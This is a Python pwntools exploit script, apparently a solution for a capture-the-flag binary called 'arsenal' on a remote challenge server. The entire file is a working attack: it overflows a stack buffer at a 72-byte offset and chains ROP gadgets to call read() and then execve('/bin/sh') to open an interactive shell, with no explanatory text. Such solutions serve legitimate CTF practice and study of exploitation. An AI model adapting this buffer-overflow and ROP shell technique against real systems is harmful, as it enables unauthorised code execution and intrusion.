#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./arsenal', checksec=False)
context.arch = 'amd64'

literal = '/bin/sh' #string to pass to .bss buffer, later used in execve
OFFSET = 72

def conn():
    if args.LOCAL:
        r = process(elf.path)
        if args.GDB:
            gdb.attach(r)
            pause()
    else:
        r = remote('offsec.m0lecon.it',13555)
    return r
 
def main():
    p = conn()
    
    p.recvuntil(b'weapons:\n')
    payload = flat(
        b'A'*OFFSET,

        # read(STDIN_FILENO,armory,256)
        p64(elf.sym.pop_rax_ret),p64(0),                      #syscall 0: read()
        p64(elf.sym.pop_rdi_ret),p64(0),                      #STDIN_FILENO 0
        p64(elf.sym.pop_rsi_ret),p64(elf.sym.armory),
        p64(elf.sym.pop_rdx_ret),p64(256),
        p64(elf.sym.syscall_ret),

        #execve(armory,0,0)
        p64(elf.sym.pop_rax_ret),p64(59),
        p64(elf.sym.pop_rdi_ret),p64(elf.sym.armory),
        p64(elf.sym.pop_rsi_ret),p64(0),
        p64(elf.sym.pop_rdx_ret),p64(0),
        p64(elf.sym.syscall_ret)
    )
    p.send(payload)
    p.send('/bin/sh\0') #to read()

    p.interactive()


if __name__=="__main__":
    main()